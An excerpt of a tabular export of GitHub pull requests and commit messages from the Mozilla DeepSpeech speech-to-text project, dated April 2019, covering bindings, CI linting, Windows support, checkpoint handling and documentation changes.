On the Python bindings I made the Metadata.items array look like a list on the Python side and cleaned up linter errors in setup.py.",reuben,477142,2019-04-25T11:51:58Z,MEMBER,True,119,118,8,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,41e6daaff28b1ba8f0e40f9f6049257e32515463,Expose deallocation functions in NodeJS binding
2134,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2073,2073,Add NodeJS v12 support,Fixes #2070,lissyx,1645737,2019-04-25T11:31:54Z,COLLABORATOR,True,1021,15,20,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f7f6a1480fe75456eed55b53e31ad715a7061190,"Add NodeJS v12 support

Fixes #2070"
2135,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2073,2073,Add NodeJS v12 support,Fixes #2070,lissyx,1645737,2019-04-25T11:31:54Z,COLLABORATOR,True,1021,15,20,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,348dd0e315aa52c13e0fe9d7883221c0ef4848e3,Add ElectronJS v5.0.0
2136,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2072,2072,Bump VERSION to 0.5.0-alpha.6,X-DeepSpeech: NOBUILD,lissyx,1645737,2019-04-25T06:41:03Z,COLLABORATOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,fab9c24fc7be1c883934cf7db206e5efb32b2893,"Bump VERSION to 0.5.0-alpha.6

X-DeepSpeech: NOBUILD"
2137,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2068,2068,LinguaLibre importer,Fixes #2067,lissyx,1645737,2019-04-23T17:36:33Z,COLLABORATOR,True,198,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,664813134e9c91cbe148b17d86353d5f19bb1ae4,"LinguaLibre importer

Fixes #2067"
2138,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2058,2058,Change CSV output to JSON,Changes CSV output to JSON and exposes transcription probability.,dabinat,18251622,2019-04-16T22:28:06Z,COLLABORATOR,True,14,5,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,8ad7e8e6d566886cf2723bf5201982a78daf6dd3,Changed CSV output to JSON
2139,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2058,2058,Change CSV output to JSON,Changes CSV output to JSON and exposes transcription probability.,dabinat,18251622,2019-04-16T22:28:06Z,COLLABORATOR,True,14,5,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,fa09736d9b3e61b7d379f073f8285cf4b7b406a0,Simplified string formatting
2140,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2046,2046,Upgrade system for Python 3.5 for decision task,"NetworkX upgrade has no more support for Python 3.4

Fixes #2045
X-DeepSpeech: NOBUILD",lissyx,1645737,2019-04-11T22:28:43Z,COLLABORATOR,True,4,2,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,42e649809c9ec2c00ceb2d01184469ef837853b4,"Upgrade system for Python 3.5 for decision task

NetworkX upgrade has no more support for Python 3.4

Fixes #2045
X-DeepSpeech: NOBUILD"
2141,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2044,2044,Fix spaces being appended to word,"I spotted a bug in the WordsFromMetadata function in the client. It should be ""if it's not a space AND if it's not a UTF8 space"", otherwise you still get the space appended to the word.",dabinat,18251622,2019-04-11T19:54:51Z,COLLABORATOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ec50fb9839baaf9c179886e78411af38d9106cc5,Fixed an issue where spaces may be appended to word
2142,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2042,2042,Move .NET bindings to native_client folder,,reuben,477142,2019-04-11T15:04:50Z,MEMBER,True,374,68,39,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,97941db3d818be833a038d6dc08489256a43f3dd,Move .NET bindings to native_client folder
2143,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2041,2041,Update requirements.txt,modules are sorted for Deepspeech support,satrioadi96,45752078,2019-04-11T06:39:54Z,NONE,False,12,12,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d7905518d3bb4afc76a813373bbf01f0f112dd1d,"Update requirements.txt

modules are sorted for Deepspeech support"
2144,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2040,2040,Add linter config for Python and CI integration on PRs,,reuben,477142,2019-04-11T00:37:22Z,MEMBER,True,852,204,14,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a16e468498d6524db9d8771bff0d6c661ded4d60,Add pylint CI
2145,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2040,2040,Add linter config for Python and CI integration on PRs,,reuben,477142,2019-04-11T00:37:22Z,MEMBER,True,852,204,14,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,13757a425883d70db9c2de45e4dd86f0f446123a,Fix pylint warnings
2146,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2040,2040,Add linter config for Python and CI integration on PRs,,reuben,477142,2019-04-11T00:37:22Z,MEMBER,True,852,204,14,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,91421a346613619a5056408d348b4c1ef8033c8d,Mention linting in README
2147,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2040,2040,Add linter config for Python and CI integration on PRs,,reuben,477142,2019-04-11T00:37:22Z,MEMBER,True,852,204,14,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6a0c186b5c1ec043520fabf4772978afba4dc05c,"Correct mistake in len check

X-DeepSpeech: NOBUILD"
2148,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2040,2040,Add linter config for Python and CI integration on PRs,,reuben,477142,2019-04-11T00:37:22Z,MEMBER,True,852,204,14,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f27ed522afcce1b653417a1b694f65e6700b0830,Git pre-commit hook instructions
2149,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2039,2039,Bash script for building the generate_trie program,"X-DeepSpeech: NOBUILD

This commit adds a single bash script for building the generate_trie program.",JRMeyer,8389864,2019-04-11T00:05:36Z,CONTRIBUTOR,False,64,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6e78d656082257a3b94ea92d42d16e4f96c27bc3,"X-DeepSpeech: NOBUILD

This commit adds a single bash script for building the generate_trie program."
2150,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2038,2038,Perform separate validation and test epochs per dataset when multiple files are specified (Fixes #1634 and #2043),"As a consequence this also removes support for caching to disk the processed validation and test sets. They're usually small enough that caching to disk makes very little difference, and the complexity of keeping track of multiple cache paths for each CSV is not worth it IMO.

Sorry for the continued churn on the progress bar/logging part of the code. This PR also includes some cleanup of that code using `progressbar.NullBar` so that there's now a single check for the `--show_progressbar` flag. With this PR, the log with and without progress bars should be consistent in the information it provides.

I recommend disabling whitespace changes for reviewing the last commit that touches `evaluate.py`, otherwise the diff ends up looking like a mess.",reuben,477142,2019-04-10T20:24:42Z,MEMBER,True,126,92,6,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a85af3da49a87ada3fa9a12760cf5533783060ea,Do separate validation epochs if multiple input files are specified
2151,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2038,2038,Perform separate validation and test epochs per dataset when multiple files are specified (Fixes #1634 and #2043),"As a consequence this also removes support for caching to disk the processed validation and test sets. They're usually small enough that caching to disk makes very little difference, and the complexity of keeping track of multiple cache paths for each CSV is not worth it IMO.

Sorry for the continued churn on the progress bar/logging part of the code. This PR also includes some cleanup of that code using `progressbar.NullBar` so that there's now a single check for the `--show_progressbar` flag. With this PR, the log with and without progress bars should be consistent in the information it provides.

I recommend disabling whitespace changes for reviewing the last commit that touches `evaluate.py`, otherwise the diff ends up looking like a mess.",reuben,477142,2019-04-10T20:24:42Z,MEMBER,True,126,92,6,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,58e9b1a78e0bc5ae64cd7c14d3fa964ce1c3fad5,Log total optimization time
2152,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2038,2038,Perform separate validation and test epochs per dataset when multiple files are specified (Fixes #1634 and #2043),"As a consequence this also removes support for caching to disk the processed validation and test sets. They're usually small enough that caching to disk makes very little difference, and the complexity of keeping track of multiple cache paths for each CSV is not worth it IMO.

Sorry for the continued churn on the progress bar/logging part of the code. This PR also includes some cleanup of that code using `progressbar.NullBar` so that there's now a single check for the `--show_progressbar` flag. With this PR, the log with and without progress bars should be consistent in the information it provides.

I recommend disabling whitespace changes for reviewing the last commit that touches `evaluate.py`, otherwise the diff ends up looking like a mess.",reuben,477142,2019-04-10T20:24:42Z,MEMBER,True,126,92,6,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,911a1ce4b17339f87f1db015267acdfe9b790680,Do separate test epochs if multiple input files are specified
2153,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2038,2038,Perform separate validation and test epochs per dataset when multiple files are specified (Fixes #1634 and #2043),"As a consequence this also removes support for caching to disk the processed validation and test sets. They're usually small enough that caching to disk makes very little difference, and the complexity of keeping track of multiple cache paths for each CSV is not worth it IMO.

Sorry for the continued churn on the progress bar/logging part of the code. This PR also includes some cleanup of that code using `progressbar.NullBar` so that there's now a single check for the `--show_progressbar` flag. With this PR, the log with and without progress bars should be consistent in the information it provides.

I recommend disabling whitespace changes for reviewing the last commit that touches `evaluate.py`, otherwise the diff ends up looking like a mess.",reuben,477142,2019-04-10T20:24:42Z,MEMBER,True,126,92,6,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,bfa070e6c305a1260fbc159ee1f8f3a8bf257f32,Compute weighted average of individual dev set losses
2154,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2038,2038,Perform separate validation and test epochs per dataset when multiple files are specified (Fixes #1634 and #2043),"As a consequence this also removes support for caching to disk the processed validation and test sets. They're usually small enough that caching to disk makes very little difference, and the complexity of keeping track of multiple cache paths for each CSV is not worth it IMO.

Sorry for the continued churn on the progress bar/logging part of the code. This PR also includes some cleanup of that code using `progressbar.NullBar` so that there's now a single check for the `--show_progressbar` flag. With this PR, the log with and without progress bars should be consistent in the information it provides.

I recommend disabling whitespace changes for reviewing the last commit that touches `evaluate.py`, otherwise the diff ends up looking like a mess.",reuben,477142,2019-04-10T20:24:42Z,MEMBER,True,126,92,6,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,9586fbbd305bb217dfed2ccb99822193b52d6f9d,Rename --train_cached_features_path to --feature_cache
2155,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2038,2038,Perform separate validation and test epochs per dataset when multiple files are specified (Fixes #1634 and #2043),"As a consequence this also removes support for caching to disk the processed validation and test sets. They're usually small enough that caching to disk makes very little difference, and the complexity of keeping track of multiple cache paths for each CSV is not worth it IMO.

Sorry for the continued churn on the progress bar/logging part of the code. This PR also includes some cleanup of that code using `progressbar.NullBar` so that there's now a single check for the `--show_progressbar` flag. With this PR, the log with and without progress bars should be consistent in the information it provides.

I recommend disabling whitespace changes for reviewing the last commit that touches `evaluate.py`, otherwise the diff ends up looking like a mess.",reuben,477142,2019-04-10T20:24:42Z,MEMBER,True,126,92,6,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,904ab1e288ce2441dc8ad2e48adf7e0b6e8983ca,Centralize progress logging and progress bar logic
2156,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2037,2037,Fix #2036 - Using dev_loss in validation log message,,tilmankamp,5991088,2019-04-10T09:51:52Z,CONTRIBUTOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,4f2d1ecc25865260d608c7e1734ae3d9b5c3b2cf,Fix #2036 - Using dev_loss in validation log message
2157,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2035,2035,Build for ElectronJS,,lissyx,1645737,2019-04-10T08:04:29Z,COLLABORATOR,True,248,3,16,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,7bd16191206b95e3c1d70bcbd76fea0e5c1ef2c4,"Build for ElectronJS

Fixes #2032"
2158,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2033,2033,Remove useless install step,,lissyx,1645737,2019-04-09T20:10:39Z,COLLABORATOR,True,2,1,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,5a6e32de5c24f4cc20854fadaece3fe015d8878d,"Enable 'use strict' and remove 'node-pre-gyp install'

Fixes #2034"
2159,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2029,2029,Use std::map to fix compilation issue with clang,"When building with clang the following compilation error is thrown:

symbol-table.h:199:3: error: no template named 'map'
    map<int64, int64> key_map_;
    ^

This patch solves that issue by explicitly specifying the std namespace.",mdigiorgio,6378106,2019-04-09T10:39:21Z,CONTRIBUTOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,aa27c61d01aa0965734f2b54264a2ab9cb437480,"Use std::map to fix compilation issue with clang

When building with clang the following compilation error is thrown:

symbol-table.h:199:3: error: no template named 'map'
    map<int64, int64> key_map_;
    ^

This patch solves that issue by explicitly specifying the std namespace."
2160,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2028,2028,Fix #2020 - Testing best-dev checkpoint,,tilmankamp,5991088,2019-04-09T09:39:43Z,CONTRIBUTOR,True,10,12,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,42e5d78e9af7db5772682041f0e8cde82b102ac2,Fix #2020 - Testing best-dev checkpoint
2161,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2028,2028,Fix #2020 - Testing best-dev checkpoint,,tilmankamp,5991088,2019-04-09T09:39:43Z,CONTRIBUTOR,True,10,12,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a0c0918e25a06a13528ad234193dc58ba7417528,Lazy-create global_step
2162,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2027,2027,Use EC2 Ubuntu mirrors for decision task,,lissyx,1645737,2019-04-09T07:11:48Z,COLLABORATOR,True,2,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,beb811e0f3a454948f31d0c51980645be611d13f,Use EC2 Ubuntu mirrors for decision task
2163,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2024,2024,Fix typo in warning name,,reuben,477142,2019-04-08T22:29:39Z,MEMBER,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,1c52008572ec9f0730fd7cc0a629c438e8d19805,Fix typo in warning name
2164,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2023,2023,"Don't calculate dataset size by hand, use tf.errors.OutOfRangeError",,reuben,477142,2019-04-08T19:18:39Z,MEMBER,True,70,42,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6ab91f37ecded40ee555141d942a2c73fe457ac0,"Don't calculate dataset size by hand, use tf.errors.OutOfRangeError"
2165,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2023,2023,"Don't calculate dataset size by hand, use tf.errors.OutOfRangeError",,reuben,477142,2019-04-08T19:18:39Z,MEMBER,True,70,42,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,cc351cd607998af07e288afa2b77540b5689b07f,Clean up progress bars for unknown size datasets
2166,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2023,2023,"Don't calculate dataset size by hand, use tf.errors.OutOfRangeError",,reuben,477142,2019-04-08T19:18:39Z,MEMBER,True,70,42,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,8053548e3449a787b709584a04d189793e10d1d5,Check for KeyboardInterrupt directly instead of using tf.train.Coordinator
2167,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2023,2023,"Don't calculate dataset size by hand, use tf.errors.OutOfRangeError",,reuben,477142,2019-04-08T19:18:39Z,MEMBER,True,70,42,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,fdc7d77ad6d39febe22a890c66cd481eb9d86ce2,Log start and end of epoch if progress bar is disabled
2168,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2022,2022,Expose extended metadata information to bindings,Fixes #2006,lissyx,1645737,2019-04-08T18:31:50Z,COLLABORATOR,True,519,116,24,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c3c3a3fb81eac6d21f5da944a2f7cc2f52583e8a,"Expose extended metadata information to bindings

Fixes #2006"
2169,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2022,2022,Expose extended metadata information to bindings,Fixes #2006,lissyx,1645737,2019-04-08T18:31:50Z,COLLABORATOR,True,519,116,24,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a9717e702aca413c14afa5409703bb965f7d74ad,Fix python linter
2170,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2019,2019,Bump VERSION to 0.5.0-alpha.5,X-DeepSpeech: NOBUILD,lissyx,1645737,2019-04-08T12:45:19Z,COLLABORATOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,4b3e8962028f9f93a1b0fee32cb543c515f16795,"Bump VERSION to 0.5.0-alpha.5

X-DeepSpeech: NOBUILD"
2171,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2018,2018,Add Windows Python packages to upload tasks,X-DeepSpeech: NOBUILD,lissyx,1645737,2019-04-08T12:44:24Z,COLLABORATOR,True,6,0,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,47ef5d3328a224dc696ffa7aec50b384ba1250fd,"Add Windows Python packages to upload tasks

X-DeepSpeech: NOBUILD"
2172,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2017,2017,Fix Windows tests execution,,lissyx,1645737,2019-04-08T07:53:36Z,COLLABORATOR,True,10,22,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,70fb52b12598bca6759d5df8a6c37bd12448cde1,Fix Windows tests execution
2173,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2017,2017,Fix Windows tests execution,,lissyx,1645737,2019-04-08T07:53:36Z,COLLABORATOR,True,10,22,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,7f345fcccc73b6efcbef3f22943b9a309e96fb23,"Remove NodeJS v5.x tests on Windows

There is no nodejs-v5.*-win-x64.zip file"
2174,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2017,2017,Fix Windows tests execution,,lissyx,1645737,2019-04-08T07:53:36Z,COLLABORATOR,True,10,22,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,98418f7628d84f6cdbbaf179e228ee99daf7147c,"Use Windows paths for NodeJS extraction

This allows to overcome the 260 chars limit, being hit with some NodeJS
instances."
2175,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2015,2015,Update README for paramiko/cryptography dependency,"On a pristine WSL Ubuntu image additional dependencies
were required. This ensures those dependencies get
installed with apt, thereby avoiding a hard to diagnose
stack trace.",dr0ptp4kt,4582553,2019-04-07T11:23:01Z,NONE,False,1,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,fa602c28d28d3eeebdd513e2658736804f0f8dce,"Update README for paramiko/cryptography dependency

On a pristine WSL Ubuntu image additional dependencies
were required. This ensures those dependencies get
installed with apt, thereby avoiding a hard to diagnose
stack trace."
2176,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2012,2012,Add probability to Metadata struct (Fixes #900),,reuben,477142,2019-04-05T21:20:34Z,MEMBER,True,17,10,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a72b69020dcb23159e333620b0908b423507c4ef,Add probability to Metadata struct and fix memory management of metadata
2177,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2011,2011,Provide an API function to free strings returned by API (Fixes #1979),,reuben,477142,2019-04-05T21:04:46Z,MEMBER,True,26,8,6,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,4b9f3fbe7dfe6828cf03765eac138fa683216ae9,Provide an API function to free strings returned by API
2178,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2011,2011,Provide an API function to free strings returned by API (Fixes #1979),,reuben,477142,2019-04-05T21:04:46Z,MEMBER,True,26,8,6,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,5054731751c344d8097da2e487812fa0398e3669,Use DS_FreeStrings in JNI bindings
2179,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2010,2010,Pylint hook 3,,reuben,477142,2019-04-05T20:20:02Z,MEMBER,False,806,214,13,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,eb858a8444775db919a2f44c27dbaec56aa6acae,Add pylint CI
2180,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2010,2010,Pylint hook 3,,reuben,477142,2019-04-05T20:20:02Z,MEMBER,False,806,214,13,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,5d0f4e83bed2ec868c196a85f3d390b0f030d138,Fix pylint warnings
2181,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2009,2009,Add pylint CI,,reuben,477142,2019-04-05T14:29:11Z,MEMBER,False,589,0,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,067903e24dc045d222ef01af792f4a944eefde96,Add pylint CI
2182,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2007,2007,Embed more metadata in exported model and read it in native client,,reuben,477142,2019-04-05T12:36:29Z,MEMBER,True,52,30,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,7f6fd8b48bef935c5adcb1bf09dce45893fab5f2,Embed more metadata in exported model and read it in native client
2183,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2005,2005,"Ignore epochs in checkpoints, always start epoch count from zero","This PR removes the epoch calculation logic when restoring checkpoints, and makes the `--epoch` flag always be relative. This avoids problems when fine tuning or transfer learning and makes it easier to think about how much training was done on a model, just look at the global step.

The tf.data input pipeline has the ability to be saved inside the checkpoint with the rest of the graph, which we can leverage to properly resume training runs stopped half way through an epoch, but it needs to be tested thoroughly.",reuben,477142,2019-04-05T03:27:47Z,MEMBER,True,59,73,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,2f3f0950489ae8de9606864de08dd1e101013b6a,"Ignore epochs in checkpoints, always start epoch count from zero"
2184,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2005,2005,"Ignore epochs in checkpoints, always start epoch count from zero","This PR removes the epoch calculation logic when restoring checkpoints, and makes the `--epoch` flag always be relative. This avoids problems when fine tuning or transfer learning and makes it easier to think about how much training was done on a model, just look at the global step.

The tf.data input pipeline has the ability to be saved inside the checkpoint with the rest of the graph, which we can leverage to properly resume training runs stopped half way through an epoch, but it needs to be tested thoroughly.",reuben,477142,2019-04-05T03:27:47Z,MEMBER,True,59,73,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,97c36291af5e22847f3f5f84de1d011c8fb78f32,Rename epoch flag to epochs
2185,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2003,2003,Windows Python bindings,Fixes #1937,lissyx,1645737,2019-04-03T14:29:25Z,COLLABORATOR,True,271,99,20,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6dbf65cce8f8b160b55a9ea62564b714170f5b5d,"Produce Windows Python bindings

Fixes #1937"
2186,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2002,2002,Native Client README split,"the current `native_client/README.md` doc contains information on both custom versions of DeepSpeech (building and installing them) as well as our pre-built version (downloading and installing).

This leads to clutter and confusion, and so this PR splits the one README into it's two logical parts:

1. Building custom code
2. Installing pre-built binaries",JRMeyer,8389864,2019-04-02T22:12:05Z,CONTRIBUTOR,True,123,143,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,86e69f54821eb43aa04e1f7b2d7eaa44329d0f03,splitting README into two documents: one for installing our binaries and one for building your own
2187,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2002,2002,Native Client README split,"the current `native_client/README.md` doc contains information on both custom versions of DeepSpeech (building and installing them) as well as our pre-built version (downloading and installing).

This leads to clutter and confusion, and so this PR splits the one README into it's two logical parts:

1. Building custom code
2. Installing pre-built binaries",JRMeyer,8389864,2019-04-02T22:12:05Z,CONTRIBUTOR,True,123,143,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e03276477b2df2c7964e7f06725df5f11345913c,typos
2188,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2002,2002,Native Client README split,"the current `native_client/README.md` doc contains information on both custom versions of DeepSpeech (building and installing them) as well as our pre-built version (downloading and installing).

This leads to clutter and confusion, and so this PR splits the one README into it's two logical parts:

1. Building custom code
2. Installing pre-built binaries",JRMeyer,8389864,2019-04-02T22:12:05Z,CONTRIBUTOR,True,123,143,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,7a39fa58d1dd91ea9a1dd96e47d04bf443016b87,"removing native_client/BUILD.md and moving to native_client/README.md --- also, re-organizing README.md"
2189,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2002,2002,Native Client README split,"the current `native_client/README.md` doc contains information on both custom versions of DeepSpeech (building and installing them) as well as our pre-built version (downloading and installing).

This leads to clutter and confusion, and so this PR splits the one README into it's two logical parts:

1. Building custom code
2. Installing pre-built binaries",JRMeyer,8389864,2019-04-02T22:12:05Z,CONTRIBUTOR,True,123,143,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,07f18e7b4efdad514db25d55301aca920661e614,merge
2190,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2002,2002,Native Client README split,"the current `native_client/README.md` doc contains information on both custom versions of DeepSpeech (building and installing them) as well as our pre-built version (downloading and installing).

This leads to clutter and confusion, and so this PR splits the one README into it's two logical parts:

1. Building custom code
